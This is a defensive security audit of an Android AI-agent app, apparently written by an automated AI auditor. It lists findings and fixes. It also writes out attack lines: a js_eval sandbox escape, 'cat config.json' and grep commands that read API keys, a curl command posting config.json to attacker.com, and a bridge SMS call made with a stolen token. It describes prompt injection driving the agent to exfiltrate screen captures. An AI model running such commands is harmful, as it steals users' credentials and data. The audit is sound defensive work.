# SECURITY-AUDIT-v8 — Full Security Audit

> **Date:** 2026-03-01
> **Scope:** Full codebase security audit — Kotlin/JVM, Node.js runtime, dependencies, CI/CD, IPC, configuration
> **Method:** Automated static analysis of all 150+ source files across 6 audit phases
> **Auditor:** Claude Opus 4.6 (automated, 4 parallel analysis agents)
> **Codebase version:** v1.4.2 (code 8), commit `a43740e`

---

## Executive Summary

SeekerClaw demonstrates strong security awareness in many areas: Android Keystore AES-256-GCM encryption, per-boot ephemeral bridge tokens, localhost-only IPC binding, zero npm runtime dependencies, parameterized SQL queries, MCP rug-pull detection, prompt injection defense layers, and a shell exec allowlist. The cryptographic implementation in `KeystoreHelper.kt` is correct and well-designed.

However, this audit identified **84 unique findings** across all phases, including **1 Critical**, **12 High**, **22 Medium**, **22 Low**, and **14 Informational** findings, plus **13 Positive** security controls.

The most severe issues center around: (1) a bypassable `js_eval` sandbox, (2) `curl`/`cat` in the shell allowlist enabling secret exfiltration past `SECRETS_BLOCKED`, (3) incomplete SSRF guards missing IPv6, (4) the owner auto-claim race condition, (5) a supply-chain risk from unverified nodejs-mobile binary downloads, and (6) CI/CD actions pinned to mutable tags.

---

## Findings Summary

| Severity | Count | Immediate Action Required |
|----------|-------|--------------------------|
| Critical | 1 | Yes |
| High | 12 | Yes |
| Medium | 22 | Next sprint |
| Low | 22 | Backlog |
| Informational | 14 | No action / positive |
| Positive Controls | 13 | Preserve |
| **Total** | **84** | |

---

## CRITICAL FINDINGS

### C-01: `js_eval` Sandbox Escape via AsyncFunction Constructor Chain
**File:** `tools.js:3548-3554`
**Phase:** Node.js Runtime

The `js_eval` tool creates an `AsyncFunction` and shadows `global`, `globalThis`, `process` by passing them as parameters. However, the real Node.js global is reachable through the prototype chain of any object in scope. Because `sandboxedRequire` passes through real modules (`require('path')`, `require('fs')`), the sandbox can be escaped:

```javascript
// Inside js_eval:
const g = (0, eval)('this');           // indirect eval returns real global
const g2 = require('module')._cache;   // loaded module registry
const cp = require('module')._resolveFilename('child_process'); // bypass blocklist
```

The `BLOCKED_MODULES` set blocks `child_process` by name, but `require('module')._cache` can surface already-loaded modules. Additionally, `http`/`https` modules are NOT blocked, enabling data exfiltration via `require('https').request(...)`.

**Mitigating Factor:** Only callable by the AI agent (Claude), which is trusted. Not exposed to external users.

**Recommended Fix:**
- Remove `sandboxedRequire` entirely (ban all `require`) and expose only a frozen utility object
- Or add `http`, `https`, `module`, `net`, `tls`, `dgram` to `BLOCKED_MODULES`
- Long-term: consider removing `js_eval` since `shell_exec` already exists

---

## HIGH FINDINGS

### H-01: `shell_exec` Can Read `SECRETS_BLOCKED` Files via `cat`/`grep`/`head`/`tail`
**Files:** `config.js:225-241`, `tools.js:3353-3464`
**Phase:** Node.js Runtime

`SECRETS_BLOCKED` (containing `config.json`, `config.yaml`, `seekerclaw.db`) is only enforced in the JS-layer `read`/`write` tools. The `shell_exec` tool allows `cat`, `grep`, `head`, `tail` — all of which can directly read these files since `cwd` is `workDir` (the workspace directory):

```
shell_exec: cat config.json    → returns full API keys, bot token, bridge token
shell_exec: grep -r "sk-ant" . → finds API key across all files
```

**Recommended Fix:**
- Apply `SECRETS_BLOCKED` basename checks to `shell_exec` command arguments before execution
- Or remove `cat` from `SHELL_ALLOWLIST` (the agent has `read` tool for file reading)

### H-02: SSRF via `curl` in `shell_exec` Bypasses All Web Fetch Guards
**Files:** `config.js:237`, `tools.js:3353`
**Phase:** Node.js Runtime

`curl` is in `SHELL_ALLOWLIST`. The `webFetch()` SSRF guard blocks private IPs, but `shell_exec` with `curl` bypasses it entirely:

```
shell_exec: curl http://127.0.0.1:8765/sms -H "X-Bridge-Token: <token>" -d '{"number":"...", "message":"..."}'
shell_exec: curl -d @config.json https://attacker.com
```

The bridge token is accessible via `cat config.json` (H-01), enabling full bridge endpoint access including `/sms`, `/call`, `/contacts/add`.

**Recommended Fix:** Remove `curl` from `SHELL_ALLOWLIST`. All HTTP functionality is available through the `web_fetch` tool.

### H-03: Incomplete SSRF Guard — IPv6 Loopback and Link-Local Not Blocked
**File:** `web.js:479`
**Phase:** Node.js Runtime

The SSRF regex only covers IPv4 patterns. IPv6 loopback `::1` and link-local `fe80::/10` are not blocked:

```javascript
// web.js:479 — only IPv4 patterns
if (/^(127\.|10\.|192\.168\.|172\.(1[6-9]|2\d|3[01])\.|169\.254\.|0\.|localhost)/i.test(url.hostname)) {
    throw new Error('Blocked: private/local address');
}
// new URL('https://[::1]:8765/battery').hostname === '[::1]' — PASSES the guard
```

**Recommended Fix:**
```javascript
function isPrivateHost(hostname) {
    const h = hostname.replace(/^\[|\]$/g, '');
    if (h === '::1') return true;
    if (/^fe[89ab][0-9a-f]:/i.test(h)) return true;
    if (/^fc[0-9a-f]{2}:/i.test(h)) return true;
    if (/^(127\.|10\.|192\.168\.|172\.(1[6-9]|2\d|3[01])\.|169\.254\.|0\.|100\.(6[4-9]|[7-9]\d|1[01]\d|12[0-7])\.)/i.test(h)) return true;
    if (h === 'localhost') return true;
    return false;
}
```

### H-04: Owner ID Auto-Claim Race — First Message Steals Ownership
**Files:** `main.js:521-534`, `AndroidBridge.kt:619-629`
**Phase:** Node.js + Kotlin (cross-layer)

When `OWNER_ID` is empty, the first Telegram message sender claims permanent ownership. No format validation (Telegram IDs are numeric), no time window, and no claim-once enforcement exist:

```javascript
// main.js:521
if (!OWNER_ID) {
    OWNER_ID = senderId; // First message wins — no auth required
}
```

The Kotlin bridge endpoint `/config/save-owner` accepts any string and persists it immediately with no check for prior ownership.

**Recommended Fix:**
- Validate owner ID format: `/^\d{1,15}$/`
- Make `saveOwnerId()` a no-op after first claim (return 403 if already set)
- Add a time window: only accept auto-claim within 5 minutes of service start
- Or require the first message to contain a setup token shown in the Android UI

### H-05: nodejs-mobile Binary Downloaded Without Integrity Verification
**File:** `app/build.gradle.kts:138-180`
**Phase:** Dependencies / Build

The build downloads `nodejs-mobile-v18.20.4-android.zip` from GitHub with **no SHA-256 checksum validation**. Combined with H-06 (Zip Slip), a compromised download could inject a malicious `libnode.so` into the APK.

**Recommended Fix:**
```kotlin
val EXPECTED_SHA256 = "paste-official-hash-here"
val actualHash = zipFile.inputStream().use { stream ->
    val digest = java.security.MessageDigest.getInstance("SHA-256")
    val buf = ByteArray(8192)
    var n: Int
    while (stream.read(buf).also { n = it } != -1) digest.update(buf, 0, n)
    digest.digest().joinToString("") { "%02x".format(it) }
}
require(actualHash == EXPECTED_SHA256) { "Checksum mismatch!" }
```

### H-06: Zip Slip Vulnerability in DownloadNodejsTask
**File:** `app/build.gradle.kts:165-178`
**Phase:** Build

ZIP extraction does not validate that entry names stay within the extraction directory:

```kotlin
val targetFile = File(extractDir, entry.name) // no canonicalization check
```

A crafted ZIP with `../../` entries could overwrite source files during build.

**Recommended Fix:**
```kotlin
val canonicalTarget = targetFile.canonicalPath
require(canonicalTarget.startsWith(extractDir.canonicalPath + File.separator)) {
    "Zip Slip detected: ${entry.name}"
}
```

### H-07: GitHub Actions Pinned to Mutable Tags, Not SHA Hashes
**Files:** `.github/workflows/build.yml`, `.github/workflows/release.yml`
**Phase:** CI/CD

All 6 third-party actions use mutable version tags (`@v4`, `@v2`). A compromised tag could execute arbitrary code with access to signing keystores and repository secrets.

**Recommended Fix:** Pin to full commit SHA:
```yaml
uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2
uses: softprops/action-gh-release@da05d552573ad5bc57f6a6b8a87f3b4ef3a5a5c4  # v2.2.2
```

### H-08: `build.yml` Has No Permissions Block (Overly Broad Default)
**File:** `.github/workflows/build.yml`
**Phase:** CI/CD

No `permissions:` key exists. Default GitHub token permissions may include `contents: write`, `packages: write`. This workflow runs on `pull_request` from forks.

**Recommended Fix:**
```yaml
permissions:
  contents: read
```

### H-09: JNI Memory Leaks — `GetStringUTFChars` Never Released
**File:** `app/src/main/cpp/native-lib.cpp:66,75`
**Phase:** Native Code

`GetStringUTFChars` is called twice per argument without corresponding `ReleaseStringUTFChars`. Memory allocated by the JVM is never freed. Bounded in practice (called once per process lifetime) but violates JNI correctness.

**Recommended Fix:** Add `env->ReleaseStringUTFChars(jarg, arg)` after each use, plus `env->DeleteLocalRef(jarg)`.

### H-10: NanoHTTPD is Unmaintained (No Patches Since 2019)
**File:** `app/build.gradle.kts:206`
**Phase:** Dependencies

`org.nanohttpd:nanohttpd:2.3.1` has received zero updates since 2019. No configurable connection limits, no TLS support, thread-per-connection model with no cap. Used for the Android Bridge on localhost:8765.

**Mitigating Factor:** Server bound to `127.0.0.1` only.

**Recommended Fix:** Replace with Ktor embedded server, or eliminate HTTP bridge entirely in favor of nodejs-mobile JNI message bridge.

### H-11: Ephemeral `config.json` — All Secrets in Plaintext for 5+ Seconds
**Files:** `OpenClawService.kt:109,143-151`, `ConfigManager.kt:268-313`
**Phase:** Kotlin / IPC

On every service start, all decrypted secrets (API key, bot token, bridge token, MCP auth tokens) are written to `workspace/config.json` in plaintext. Deletion happens 5 seconds later via a coroutine — subject to scheduling delays and not guaranteed if the service crashes.

**Recommended Fix:**
- Pass secrets via JNI bridge environment or stdin instead of filesystem
- If file-based: shorten window to <1s, ensure cleanup on crash recovery
- Add startup guard: delete stale `config.json` before re-writing

### H-12: Blocking Spin-Poll on NanoHTTPD Worker Threads (DoS)
**File:** `AndroidBridge.kt:410-431,498-515,546-562,593-609`
**Phase:** Kotlin

Four handlers (`/camera/capture`, `/solana/authorize`, `/solana/sign`, `/solana/sign-only`) block NanoHTTPD threads with `Thread.sleep()` loops for 30-120 seconds. A small number of concurrent requests exhausts the thread pool, making the bridge unresponsive to `/ping` (watchdog health check).

**Recommended Fix:** Replace with `CountDownLatch` / `CompletableFuture` driven by `FileObserver`.

---

## MEDIUM FINDINGS

### M-01: Timing-Attack Vulnerable Token Comparison
**File:** `AndroidBridge.kt:74`

Bridge token compared with `!=` (lexicographic, short-circuits on first differing byte). Use `MessageDigest.isEqual()` for constant-time comparison.

### M-02: Unvalidated Phone Number in `tel:` URI
**File:** `AndroidBridge.kt:316`

Raw user-supplied `phone` string interpolated into `Uri.parse("tel:$phone")` without format validation.

**Fix:** Validate against `^[+0-9 ()\\-]{5,20}$`.

### M-03: `writeWalletConfig` JSON Injection via String Interpolation
**File:** `ConfigManager.kt:458`

`label` is user-supplied and interpolated without escaping: `"""{"publicKey": "$address", "label": "$label"}"""`. Use `JSONObject` instead.

### M-04: SSRF in `ConfigClaimImporter` — `claimId` Not URL-Encoded
**File:** `ConfigClaimImporter.kt:231-237`

`claimId` from QR payload is interpolated into a URL path without encoding. Path traversal sequences could redirect to unintended endpoints.

### M-05: `android_camera_capture` Not in `CONFIRM_REQUIRED`
**File:** `config.js:249-256`

Camera capture tool can silently photograph the user's environment without confirmation. Combined with `showWhenLocked`/`turnScreenOn` in the manifest, the agent could capture photos while device is locked.

**Fix:** Add `android_camera_capture` (and `android_location`) to `CONFIRM_REQUIRED`.

### M-06: `screencap` in Shell Allowlist Enables Silent Screen Capture
**File:** `config.js:240`

`screencap /path/to/screen.png` captures the current screen. Via prompt injection + `telegram_send_file`, screen contents are exfiltrated silently.

**Fix:** Remove from `SHELL_ALLOWLIST` or add as a dedicated tool behind `CONFIRM_REQUIRED`.

### M-07: `getprop` in Shell Allowlist Leaks Device PII
**File:** `config.js:240`

`getprop` without arguments dumps all system properties including serial numbers, carrier config, MAC addresses.

**Fix:** Remove from `SHELL_ALLOWLIST` or restrict to safe property names only.

### M-08: `printenv` in Shell Allowlist Leaks Environment Variables
**File:** `config.js:238`

Despite stripping `KEY`/`TOKEN`/`SECRET` env vars from the child process, non-standard naming survives.

**Fix:** Remove from `SHELL_ALLOWLIST`.

### M-09: `base64` in Shell Allowlist Enables Encoded Exfiltration
**File:** `config.js:239`

`base64 config.json` encodes secrets for exfiltration past text-based detection.

**Fix:** Remove from `SHELL_ALLOWLIST`.

### M-10: Contact Search `limit` Parameter Not Bounded
**File:** `AndroidBridge.kt:227`

`params.optInt("limit", 10)` has no maximum. Setting to `Integer.MAX_VALUE` causes OOM.

**Fix:** `.coerceIn(1, 100)`.

### M-11: No Gradle Dependency Verification
**Phase:** Dependencies

No `gradle/verification-metadata.xml` exists. Any dependency could be substituted by a malicious artifact from a compromised Maven mirror.

**Fix:** Run `./gradlew --write-verification-metadata sha256`.

### M-12: Node.js 18 LTS — End of Life (April 2025)
**Phase:** Dependencies

Node.js 18 no longer receives security patches. Any CVEs discovered after April 2025 in V8 or Node core are unpatched.

### M-13: Missing Network Security Config — No Certificate Pinning
**File:** `AndroidManifest.xml`

No `android:networkSecurityConfig` attribute. No cert pinning for `api.anthropic.com` or `api.telegram.org` where API keys and bot tokens are transmitted.

### M-14: ProGuard Rules Dangerously Minimal
**File:** `app/proguard-rules.pro`

No explicit rule for JNI entry point `NodeBridge.startNodeWithArguments`. If ProGuard renames it, JNI call fails at runtime.

### M-15: Debug Logging Not Stripped in Release Builds
**Files:** Multiple `.kt` files

`Log.d()` calls execute in release builds. `AndroidBridge.kt` logs every HTTP request path to logcat.

**Fix:** Add ProGuard rule: `-assumenosideeffects class android.util.Log { public static *** d(...); }`

### M-16: Bridge Token File is Plaintext
**File:** `ServiceState.kt:124-131`

Per-boot bridge token written as plaintext to `files/bridge_token`. Any process gaining file access learns the token.

### M-17: `release.yml` Workflow-Level `contents: write` Applies to All Jobs
**File:** `.github/workflows/release.yml:8-9`

Only the `release` job needs write access. Build jobs should be `contents: read`.

### M-18: Keystores Decoded Into Working Directory, Not Cleaned Up
**File:** `.github/workflows/release.yml:36-38,94-96`

`.jks` files written inside `app/` during CI. Risk of accidental artifact inclusion.

### M-19: Firebase Analytics vs. "No Telemetry" Documentation Contradiction
**Files:** `SeekerClawApplication.kt:20-23`, `app/build.gradle.kts:222-223`

Firebase Analytics bundled unconditionally. CLAUDE.md states "no telemetry." `auth_type`, `model`, `has_wallet` properties sent to Google.

**Fix:** Either remove Firebase or gate behind `googlePlayImplementation(...)`.

### M-20: DNS Rebinding Not Prevented in `webFetch` Redirect Chain
**File:** `web.js:470-513`

SSRF guard checks hostname strings, not resolved IPs. DNS rebinding (first resolution passes, later resolves to `127.0.0.1`) is not prevented.

### M-21: Solana Address Validation Accepts 32-Character Strings
**File:** `solana.js`

Regex allows 32-44 character base58 strings. Valid Solana public keys are always 43-44 characters.

**Fix:** Change to `{43,44}`.

### M-22: `isAllowedClaimUrl` Permits HTTP to `10.0.2.2` in Production
**File:** `ConfigClaimImporter.kt:253`

Emulator gateway address allowed for non-HTTPS. Should be gated behind `BuildConfig.DEBUG`.

---

## LOW FINDINGS

### L-01: `e.printStackTrace()` in Production Paths
**File:** `NodeBridge.kt:175,204`

### L-02: Stats Server on Port 8766 Has No Authentication
**File:** `AndroidBridge.kt:635-655` / `database.js`

### L-03: Bridge Error Responses Expose Internal Exception Messages
**File:** `AndroidBridge.kt:124`

### L-04: No Keystore Key Rotation Mechanism
**File:** `KeystoreHelper.kt`

### L-05: `setUserAuthenticationRequired(false)` — Documented But Notable
**File:** `KeystoreHelper.kt:35`

### L-06: ZIP Import Per-Entry Size Not Limited
**File:** `ConfigManager.kt:1100-1174`

### L-07: MCP Server Auth Token Not Validated Over HTTPS in Import Path
**File:** `ConfigClaimImporter.kt` / `ConfigManager.kt`

### L-08: sol4k Outdated (0.4.2)
**Phase:** Dependencies

### L-09: CameraX Version Declared in Two Places
**File:** `app/build.gradle.kts:215-218` + `libs.versions.toml:9`

### L-10: `requestId` Not Validated as UUID in `CameraCaptureActivity` / `SolanaAuthActivity`
**Files:** `CameraCaptureActivity.kt:38,119`, `SolanaAuthActivity.kt:34,108`

Path traversal possible if `requestId` contains `../../`.

### L-11: TTS `pitch`/`speed` Parameters Unbounded
**File:** `AndroidBridge.kt:376-381`

### L-12: `handleAppsLaunch` — No Package Name Validation/Blocklist
**File:** `AndroidBridge.kt:451-465`

### L-13: Node.js Log Forwarding — No Redaction Filter
**File:** `OpenClawService.kt:211`

### L-14: VLA (Variable-Length Array) Usage in Native Code
**File:** `native-lib.cpp:71`

### L-15: Node.js Arguments Logged to Logcat in Release Builds
**File:** `native-lib.cpp:86-88`

### L-16: CI Changelog Extraction Uses Tag-Derived Variable in awk
**File:** `.github/workflows/release.yml:147-159`

### L-17: `agent_settings.json` API Keys Written in Plaintext
**File:** `config.js:305-323`

### L-18: Task Checkpoint Files Expose Conversation History
**File:** `task-store.js:21-84`

### L-19: Early Startup Log Lines Written Before `setRedactFn()`
**File:** `config.js:76-78,167`

### L-20: SILENT_REPLY Content Logged Before Suppression
**File:** `main.js`

### L-21: `.gitignore` Missing `*.p8`, `*.bks`, `*.cer` Patterns
**File:** `.gitignore:43-48`

### L-22: `config.js` Startup Check Omits `BRIDGE_TOKEN` Validation
**File:** `config.js:155-158`

---

## INFORMATIONAL

### I-01 (Positive): `android:allowBackup="false"` Correctly Configured
### I-02 (Positive): All Non-Main Activities Correctly `exported="false"`
### I-03 (Positive): KeystoreHelper Cryptographic Design is Sound (AES-256-GCM, random IV, hardware-backed)
### I-04 (Positive): No Hardcoded Credentials in Source Code
### I-05 (Positive): Zero npm Runtime Dependencies — No Supply Chain Risk
### I-06 (Positive): Parameterized SQL Queries Throughout (no SQL injection)
### I-07 (Positive): SHA-256 Rug-Pull Detection in MCP Client
### I-08 (Positive): Unicode Homoglyph Normalization in `security.js`
### I-09 (Positive): `CONFIRM_REQUIRED` Gate for Financial/Communication Tools
### I-10 (Positive): BigInt Arithmetic in Solana — No Floating-Point Precision Loss
### I-11 (Positive): TLS 1.2+ Enforcement with Certificate Validation in MCP Client
### I-12 (Positive): Cross-Origin Auth Header Stripping on Redirects in `webFetch`
### I-13 (Positive): `verifySwapTransaction()` Program Allowlist Before Jupiter Swap

### I-14: Stats Server on :8766 Unauthenticated (localhost-only, non-sensitive data)

---

## Priority Remediation Order

### Tier 1 — Do This Now (Critical + High)

| # | Finding | Effort | Impact |
|---|---------|--------|--------|
| 1 | H-01/H-02: Remove `curl`, `cat`, `base64` from `SHELL_ALLOWLIST` | Low | Closes primary exfiltration vector |
| 2 | H-03: Fix SSRF guard for IPv6 | Low | Prevents bridge auth bypass |
| 3 | H-04: Add owner ID claim-once enforcement + format validation | Low | Prevents account takeover |
| 4 | C-01: Block `http`/`https`/`module` in `js_eval` `BLOCKED_MODULES` | Low | Closes sandbox escape |
| 5 | H-05/H-06: Add SHA-256 + Zip Slip guard to nodejs-mobile download | Low | Supply chain integrity |
| 6 | H-07/H-08: Pin CI actions to SHA, add `permissions: contents: read` | Low | CI supply chain |
| 7 | M-05: Add `android_camera_capture` to `CONFIRM_REQUIRED` | Trivial | Prevents silent photo capture |

### Tier 2 — Next Sprint (Medium)

| # | Finding | Effort | Impact |
|---|---------|--------|--------|
| 8 | M-06/M-07/M-08/M-09: Remove `screencap`, `getprop`, `printenv`, `base64` from allowlist | Low | Reduces shell attack surface |
| 9 | M-01: Constant-time token comparison | Trivial | Defense-in-depth |
| 10 | M-03: Fix `writeWalletConfig` JSON injection | Trivial | Correctness |
| 11 | M-10: Bound contact search limit | Trivial | Prevents OOM |
| 12 | M-11: Enable Gradle dependency verification | Low | Supply chain |
| 13 | M-13: Add `network_security_config.xml` | Low | Certificate pinning |
| 14 | M-14/M-15: Fix ProGuard rules, strip debug logs | Low | Release hardening |
| 15 | M-19: Gate Firebase to `googlePlay` flavor only | Low | Policy compliance |
| 16 | H-09: Fix JNI memory leaks | Low | Correctness |
| 17 | H-11: Reduce config.json plaintext window | Medium | Secret protection |

### Tier 3 — Backlog (Low)

All Low findings can be addressed incrementally during regular development.

---

## Positive Security Controls (Preserve These)

1. **Android Keystore encryption** — AES-256-GCM, random IV, hardware-backed
2. **Per-boot bridge token** — ephemeral UUID, regenerated on each service start
3. **Localhost-only binding** — AndroidBridge on `127.0.0.1:8765`
4. **Zero npm dependencies** — no runtime npm supply chain risk
5. **Parameterized SQL** — all SQL.js queries use prepared statements
6. **MCP rug-pull detection** — SHA-256 hash comparison of tool definitions
7. **CONFIRM_REQUIRED gate** — owner must `/approve` SMS, calls, swaps, sends
8. **TOOL_RATE_LIMITS** — financial tools limited to 1 per 15 seconds
9. **TLS enforcement** — MCP client requires TLS 1.2+, `rejectUnauthorized: true`
10. **Cross-origin header stripping** — Auth/Cookie headers stripped on redirects
11. **`verifySwapTransaction()`** — program allowlist before Jupiter execution
12. **Atomic file writes** — tmp → backup → rename in cron.js, task-store.js
13. **`wrapExternalContent()`** — consistent untrusted content marking

---

## Shell Allowlist Recommendations

Current `SHELL_ALLOWLIST` has 34 commands. Recommended removals for Tier 1+2:

| Command | Risk | Remove? | Alternative |
|---------|------|---------|-------------|
| `curl` | SSRF, exfiltration, bridge bypass | **YES** | `web_fetch` tool |
| `cat` | Reads `SECRETS_BLOCKED` files | **YES** | `read` tool |
| `base64` | Encodes secrets for exfiltration | **YES** | Dedicated tool if needed |
| `screencap` | Silent screen capture | **YES** | `android_screenshot` behind `CONFIRM_REQUIRED` |
| `getprop` | Device PII leakage | **YES** | `android_bridge /battery,/storage,/network` |
| `printenv` | Env var leakage | **YES** | Remove entirely |
| `sed` | Moderate risk (file modification) | Keep | Already constrained by `safePath()` |
| `grep` | Low risk (can read secrets via args) | Keep | Apply `SECRETS_BLOCKED` to args |
| `find` | Info disclosure (directory structure) | Keep | Low risk |

Post-cleanup: 28 commands (down from 34).

---

## Files Critical to Security Model

| File | Role |
|------|------|
| `AndroidBridge.kt` | IPC attack surface — all 20+ endpoints |
| `KeystoreHelper.kt` | Encryption layer for all secrets |
| `ConfigManager.kt` | Secret storage, config.json generation, ZIP import |
| `ConfigClaimImporter.kt` | QR/URL config import, URL allowlist |
| `OpenClawService.kt` | Service lifecycle, credential-to-disk flow |
| `ServiceState.kt` | Bridge token cross-process communication |
| `native-lib.cpp` | JNI entry point, memory handling |
| `config.js` | SHELL_ALLOWLIST, SECRETS_BLOCKED, CONFIRM_REQUIRED |
| `security.js` | Secret redaction, path validation, injection patterns |
| `tools.js` | shell_exec, js_eval sandbox, all tool dispatch |
| `web.js` | SSRF guard, HTTP fetch, redirect handling |
| `mcp-client.js` | MCP auth, rug-pull detection, TLS enforcement |
| `solana.js` | Address validation, transaction verification |
| `main.js` | Owner gate, message handler, auto-claim logic |

---

## Methodology Notes

This audit was conducted via automated static analysis across 4 parallel agents:
1. **Kotlin/JVM Agent** — Read all 37 `.kt` files + `AndroidManifest.xml`
2. **Node.js Runtime Agent** — Read all 15 `.js` files + `package.json`
3. **Dependency Agent** — Analyzed `libs.versions.toml`, `build.gradle.kts`, `package.json`, bundled JS headers
4. **CI/CD & Config Agent** — Analyzed workflows, `.gitignore`, `proguard-rules.pro`, `native-lib.cpp`, `SECURITY.md`

Limitations:
- No dynamic analysis (no running the app or fuzzing endpoints)
- No network-level testing (no actual SSRF/DNS rebinding verification)
- Dependency CVE knowledge limited to May 2025 training data + web search
- No review of `openclaw-reference/` (out of scope — tracked separately)
